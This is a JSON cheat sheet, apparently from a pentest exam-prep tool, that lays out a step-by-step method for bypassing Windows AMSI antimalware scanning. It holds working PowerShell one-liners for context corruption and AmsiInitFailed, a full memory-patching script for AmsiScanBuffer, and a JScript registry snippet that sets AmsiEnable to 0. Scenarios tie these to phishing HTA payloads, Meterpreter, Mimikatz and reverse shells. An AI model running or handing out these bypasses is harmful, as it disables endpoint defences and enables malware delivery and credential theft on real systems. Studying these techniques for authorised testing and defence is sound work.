{
  "cheatsheets": [
    {
      "id": "amsi-bypass-methodology",
      "name": "AMSI Bypass - Comprehensive Methodology",
      "description": "Scenario-based guide for bypassing AMSI in Windows 10/11 environments. Covers memory patching, context corruption, and registry-based bypasses with timing estimates.",
      "category": "av-evasion",
      "educational_header": {
        "how_to_recognize": [
          "PowerShell script blocked with 'This script contains malicious content' error",
          "Invoke-Expression fails with AMSI detection message",
          "Download cradles (IEX, WebClient) trigger immediate blocking",
          "Known malicious strings ('Invoke-Mimikatz', 'amsiutils') cause red error messages",
          "Base64-encoded payloads decode successfully but execution is blocked",
          "Remote PowerShell scripts download but won't execute via IEX"
        ],
        "when_to_look_for": [
          "After gaining initial shell on Windows 10/11 systems (AMSI enabled by default)",
          "Before executing PowerShell-based tools (Mimikatz, PowerView, Invoke-Obfuscation)",
          "When remote download cradles fail with AMSI errors",
          "During phishing campaigns using JScript/VBScript payloads (AMSI integrated in WSH)",
          "When Meterpreter PowerShell post-exploitation modules are blocked",
          "Before running any PowerShell enumeration scripts on target systems"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: PowerShell Download Cradle (AMSI Blocks IEX)",
          "context": "Target: Windows 10 21H2 with Defender enabled. You have initial shell access (cmd.exe) and need to download/execute PowerShell payload. Standard IEX download cradle triggers AMSI detection immediately.",
          "approach": "Phase 1: Detection (30 seconds)\n- Test AMSI with benign payload using amsi-test-payload\n- Execute: powershell -c \"'Invoke-Mimikatz'\"\n- Verify 'malicious content' error appears (confirms AMSI active)\n\nPhase 2: Context Corruption Bypass (1-2 minutes)\n- Execute amsi-context-corruption one-liner from cmd.exe\n- Paste full reflection-based bypass into PowerShell session\n- Verify AMSI bypass with second amsi-test-payload test\n- Execute actual download cradle if bypass successful\n- Time checkpoint: Should see no red errors within 2 minutes\n\nPhase 3: Fallback (if Phase 2 fails, 2-3 minutes)\n- Try amsi-memory-patch as alternative (more code but more reliable)\n- Paste complete memory patching script into PowerShell\n- Test persistence of bypass across PowerShell sessions\n- If still failing, try amsi-init-failed (fastest but least reliable)",
          "commands": [
            "amsi-test-payload",
            "amsi-context-corruption",
            "amsi-memory-patch",
            "amsi-init-failed"
          ],
          "expected_outcome": "AMSI bypassed in 2-4 minutes total. Download cradles execute without detection. Bypass persists for current PowerShell session only (not across reboots or new sessions). Success indicators: Test payload echoes without red error, IEX downloads execute cleanly, No EventLog 1116 entries (AMSI scan blocked). Failure indicators: Red 'malicious content' error persists, PowerShell crashes during bypass, New sessions revert to AMSI-protected state.",
          "why_this_works": "Context corruption zeroes out AmsiContext structure before AmsiScanBuffer is called. This prevents AMSI from initializing properly, causing silent failure with E_INVALIDARG return code. Windows logs error internally but allows execution to continue (fail-open design). Memory patching directly overwrites AmsiScanBuffer's return value to always return AMSI_RESULT_CLEAN (0x00000000). Patches with assembly: XOR RAX,RAX; RET (0x48,0x31,0xC0,0xC3) which forces clean scan result. Technical depth: AmsiScanBuffer resides in amsi.dll loaded by PowerShell process. VirtualProtect changes memory page from RX to RWX (0x40), allowing write to executable code. After patching, all subsequent AmsiScanBuffer calls return clean immediately without scanning. relevance: Critical for exam - most public PowerShell tools are AMSI-flagged. Practice all three methods before exam day."
        },
        {
          "title": "Scenario 2: Meterpreter Post-Exploitation (AMSI Flags Scripts)",
          "context": "You have Meterpreter shell on Windows 11 target. Attempting to run post-exploitation PowerShell scripts (PowerView, Invoke-Mimikatz) triggers AMSI detection and blocks execution. Standard Meterpreter PowerShell extension is blocked.",
          "approach": "Phase 1: Verification (1 minute)\n- From Meterpreter, run 'load powershell' and attempt execution\n- Execute amsi-test-payload via 'powershell_execute' command\n- Confirm AMSI is active and blocking (see red errors in output)\n- Document exact error message for troubleshooting\n\nPhase 2: AmsiInitFailed Bypass (2 minutes)\n- Execute amsi-init-failed one-liner to force AMSI initialization failure\n- From Meterpreter: powershell_execute \"[Ref].Assembly.GetTypes()...\"\n- Re-test with amsi-test-payload immediately after\n- Load PowerView/Mimikatz if successful (no red errors)\n- Time checkpoint: Should have working bypass within 3 minutes\n\nPhase 3: Staged Payloads (if Phase 2 fails, 3-5 minutes)\n- Use amsi-base64-staging to obfuscate payload on attacker machine\n- Generate Base64 payload: echo -n \"[bypass]\" | iconv -t UTF-16LE | base64 -w0\n- Execute via: powershell -EncodedCommand <BASE64>\n- Base64 delays AMSI scanning until runtime, may evade detection\n- If Base64 still blocked, use amsi-memory-patch as last resort",
          "commands": [
            "amsi-test-payload",
            "amsi-init-failed",
            "amsi-base64-staging",
            "amsi-memory-patch"
          ],
          "expected_outcome": "AMSI bypassed within 3-6 minutes total. PowerShell post-exploitation tools execute successfully. Meterpreter session remains stable throughout bypass attempts. Success indicators: PowerView/Mimikatz execute without errors, No process crashes or session disconnects, Subsequent PowerShell commands run cleanly. Failure indicators: Session terminates during bypass attempt (restart and use alternate method), Bypass works but doesn't persist (normal - reapply for each new command), Memory patching blocked by EDR (try context corruption instead). Next steps: Document which bypass method worked for this target (reuse on similar systems), Run full post-exploitation enumeration (now unblocked), Consider persistence mechanisms if long-term access needed.",
          "why_this_works": "Forcing AmsiInitialize to return failure code makes Windows think AMSI library is unavailable. System logs error (Event ID 1116) but continues execution (backwards compatibility with systems where AMSI.DLL missing). This is Microsoft's fail-open design - prioritizes execution over security. Base64 staging avoids on-disk signatures and delays AMSI scanning until runtime. AMSI scans when script enters PowerShell parser, but EncodedCommand bypasses initial scan. However, newer Defender versions (2022+) scan decoded Base64 too, making this method less reliable. Technical depth: AmsiInitFailed flag is static field in System.Management.Automation.AmsiUtils class. Setting to $true causes all subsequent AmsiScanBuffer calls to immediately return without scanning. Reflection allows runtime modification of private static fields without recompiling .NET assemblies. pentest tip: AmsiInitFailed is fastest but most likely to be patched in exam machines. Always test on practice labs first. Memory patching more reliable but requires more code and time."
        },
        {
          "title": "Scenario 3: WSH/JScript Macro Delivery (AMSI Blocks WSH)",
          "context": "Phishing scenario: Delivering JScript payload via HTA or WSF file. Windows 10 1909+ has AMSI integrated into Windows Script Host, blocking malicious JScript even before PowerShell is involved. Victim double-clicks HTA file but script is blocked.",
          "approach": "Phase 1: Registry Bypass Preparation (2 minutes)\n- Craft HTA/WSF payload with amsi-jscript-registry one-liner embedded\n- Registry modification: HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable = 0\n- Test payload structure: Registry write -> Test string -> Actual payload\n- Ensure registry write succeeds before payload execution (error handling critical)\n\nPhase 2: Payload Delivery (1 minute)\n- Embed registry bypass at start of JScript payload (first 10 lines)\n- Test locally with amsi-test-payload equivalent: WScript.Echo('amsiutils')\n- If test string echoes without error, bypass successful\n- Execute actual malicious payload (download cradle, reverse shell, etc.)\n- Time checkpoint: Full payload execution within 3 minutes of victim click\n\nPhase 3: Cleanup Awareness (30 seconds)\n- Document registry key location: HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable\n- Note: Registry change persists until reboot or manual deletion\n- Consider cleanup script at end of payload (stealth) vs persistence (long-term access)\n- pentest consideration: Cleanup may break other payloads if multi-stage attack",
          "commands": [
            "amsi-jscript-registry",
            "amsi-test-payload"
          ],
          "expected_outcome": "JScript executes without AMSI interference on target system. Registry bypass persists across script executions (same user session). Requires manual cleanup to avoid detection by defenders. Success indicators: HTA/WSF file executes fully without 'malicious content' errors, Registry key created successfully (verify with reg query command), Payload executes as intended (reverse shell connects, files exfiltrated, etc.). Failure indicators: Registry write fails (rare for HKCU but possible with AppLocker/Applocker), AMSI still blocks after registry change (may indicate group policy override), Script crashes during registry write (add error handling). Time investment: 3-4 minutes total from victim click to full execution. pentest frequency: Lower (phishing less common in exam) but critical for AD environments. Cleanup considerations: Registry key visible to forensics, persists in registry hives, may alert EDR if monitored. Alternative if registry blocked: Use PowerShell download cradle instead of JScript, or compile JScript to executable with JScript.NET compiler.",
          "why_this_works": "Registry key 'HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable = 0' tells WSH to skip AMSI checks entirely. This is Microsoft's official interface for developers to disable AMSI during debugging - not a hack or exploit. Documented in MS-AMSI specification but widely unknown to defenders. Why exploitable: HKCU is user-writable (no admin rights needed), WSH checks registry before every script execution, No integrity checks on registry value (any user can set). Technical depth: WSH architecture: wscript.exe/cscript.exe loads jscript.dll -> jscript.dll checks HKCU\\...\\AmsiEnable before calling amsi.dll -> If value = 0, skip amsi.dll entirely. This is fail-open design for backwards compatibility with systems where AMSI missing. Security trade-off: Microsoft prioritizes developer experience over security for HKCU settings. HKLM equivalent (HKEY_LOCAL_MACHINE\\...) would require admin but is policy-enforceable. pentest defense perspective: Group Policy can override HKCU settings, forcing AMSI enabled. But most pentest lab/exam machines don't have this configured. Why common in wild: Phishing campaigns use HTA/WSF files extensively (bypass email filters), JScript can download/execute additional payloads without PowerShell detection, Users habituated to double-clicking .hta files from 'tech support' emails."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Detection & Testing",
          "notes": "Always verify AMSI is active before attempting bypass. Baseline testing prevents wasted time on systems without AMSI enabled (Windows 7, Server 2012 R1 and older). Test with known malicious strings: 'Invoke-Mimikatz', 'amsiutils', 'AmsiScanBuffer'. If these strings echo without red errors, AMSI is not active (skip bypass, proceed directly to payload). If red 'malicious content' error appears, AMSI is active (proceed to Phase 2). Time investment: 30 seconds. practical tip: Test AMSI before downloading large payloads - saves bandwidth and time if bypass needed.",
          "commands": [
            {
              "id": "amsi-test-payload",
              "example": "'Invoke-Mimikatz'",
              "shows": "String echoes back without red 'This script contains mali..."
            }
          ]
        },
        {
          "title": "Phase 2: Quick Bypasses (In-Memory)",
          "notes": "Fastest methods for immediate access. These bypasses are session-specific and don't persist across reboots or new PowerShell sessions. Try in order: Context Corruption (best balance of speed/reliability) -> AmsiInitFailed (fastest but may be patched) -> Memory Patching (slowest but most reliable). All methods require active PowerShell session - can't be applied from cmd.exe to 'future' PowerShell sessions. Persistence note: Bypass must be reapplied for every new PowerShell process. Consider automating in initial access payload. pentest timing: Budget 2-4 minutes for bypass in pentest timeline. Practice typing these commands from memory - clipboard access may be limited in exam environment.",
          "commands": [
            {
              "id": "amsi-context-corruption",
              "example": "[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*Context'}|%{[IntPtr]$ptr=$_.GetValue($null);[System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes(0),0,$ptr,4)}}",
              "shows": "No output indicates success. Subsequent AMSI checks will ..."
            },
            {
              "id": "amsi-init-failed",
              "example": "[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*InitFailed'}|%{$_.SetValue($null,$true)}}",
              "shows": "No output. AMSI will report initialization failure and sk..."
            },
            {
              "id": "amsi-memory-patch",
              "example": "$Win32=@\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\nAdd-Type $Win32\n$lib=[Win32]::LoadLibrary(\"amsi.dll\")\n$addr=[Win32]::GetProcAddress($lib,\"AmsiScanBuffer\")\n$p=0\n[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)\n$patch=[Byte[]](0x48,0x31,0xC0,0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,4)",
              "shows": "[+] AMSI patched successfully (if using verbose version)...."
            }
          ]
        },
        {
          "title": "Phase 3: Persistent/Alternative Bypasses",
          "notes": "Use when in-memory bypasses fail or when persistence is needed across reboots/sessions. Registry-based bypasses survive reboots but may trigger EDR alerts (registry modification monitoring). Base64 staging useful for evading static signatures but less effective against modern Defender (scans decoded content). Trade-offs: Persistence = Higher detection risk, Session-only = Must reapply but lower forensic footprint. pentest considerations: Registry changes persist in lab environment (may affect other students), Base64 useful for exam machines with strict execution policies. When to use: JScript/VBScript delivery (use registry method), Initial access payloads (embed Base64), Long-term persistence needed (registry method with cleanup plan). Cleanup: Always document registry keys created - required for pentest report.",
          "commands": [
            {
              "id": "amsi-jscript-registry",
              "example": "var sh = new ActiveXObject(\"WScript.Shell\");\nvar key = \"HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\";\ntry {\n    var val = sh.RegRead(key);\n    if(val != 0) {\n        sh.RegWrite(key, 0, \"REG_DWORD\");\n    }\n} catch(e) {\n    sh.RegWrite(key, 0, \"REG_DWORD\");\n}\nWScript.Echo(\"AMSI disabled for WSH\");",
              "shows": "Registry key set, AMSI disabled for current user's WSH se..."
            },
            {
              "id": "amsi-base64-staging",
              "example": "powershell -EncodedCommand [BASE64_BYPASS]",
              "shows": "Bypass executes silently from encoded payload. Test with ..."
            }
          ]
        },
        {
          "title": "Phase 4: Validation",
          "notes": "After bypass, always re-test with known malicious payload. Confirms AMSI is truly disabled, not just returning false positives. Test with multiple strings: 'Invoke-Mimikatz' (most reliable), 'amsiutils' (alternate test), actual payload snippet (end-to-end test). If test fails after bypass: Try next bypass method in sequence, Check for EDR interference (process injection, memory protection), Verify PowerShell version (.NET 4.0+ required for reflection methods), Consider alternate execution contexts (runspaces, background jobs). Success criteria: Test string echoes without red error, No Event ID 1116 in Windows Defender logs, Actual payload executes cleanly. Time investment: 10-15 seconds per validation. workflow: Test -> Bypass -> Re-test -> Execute payload. Never skip re-test step - false positives waste precious pentest time.",
          "commands": [
            {
              "id": "amsi-test-payload",
              "example": "'Invoke-Mimikatz'",
              "shows": "String echoes back without red 'This script contains mali..."
            }
          ]
        }
      ],
      "tags": [
        "amsi",
        "windows-defender",
        "powershell",
        "bypass",
        "evasion",
        "memory-patching",
        "registry",
        "PRIORITY:HIGH",
        "post-exploitation",
        "av-evasion"
      ]
    }
  ]
}